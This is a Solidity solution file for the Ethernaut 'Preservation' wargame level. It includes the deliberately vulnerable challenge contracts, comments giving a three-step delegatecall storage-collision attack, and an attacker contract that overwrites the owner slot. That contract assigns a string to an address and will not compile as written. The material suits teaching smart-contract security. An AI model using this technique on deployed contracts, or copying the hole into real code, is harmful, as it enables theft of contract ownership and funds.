// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title 16. PRESERVATION
 * @dev Claim ownership of the instance you are given.
 */

// The storage of the Preservation contract and the one of the LibraryContract are not the same.
// Delegatecall was not a good option here.
// 1. Deploy a new contract wih a modified logic in the setTime function (setting ownership to us for instance)
// 2. Call the setFirstTime function with the address of the new deployed contract.
// 3. Call the setFirstTime function again with any value to change the ownership.

contract Ethernaut_Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = "Your address here";
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}
